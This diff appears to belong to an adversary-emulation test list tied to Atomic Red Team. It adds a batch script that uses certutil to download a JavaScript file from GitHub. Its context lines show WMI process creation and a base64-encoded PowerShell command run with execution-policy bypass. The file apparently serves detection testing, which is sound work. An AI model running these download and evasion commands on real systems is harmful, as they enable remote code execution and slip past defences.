@@ -63,6 +63,17 @@ WMI Execute Local Process
 wmic process call create notepad.exe
 
 
+@echo off
+set "directoryPath=C:\Users\T1059.007\src"
+
+:: Create the directory if it doesn't exist
+if not exist "%directoryPath%" mkdir "%directoryPath%"
+
+:: Download the file using certutil
+certutil -urlcache -split -f "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.007/src/sys_info.js" "%directoryPath%\sys_info.js"
+
+
+
 *
 Create a Process using WMI Query and an Encoded Command
 powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA
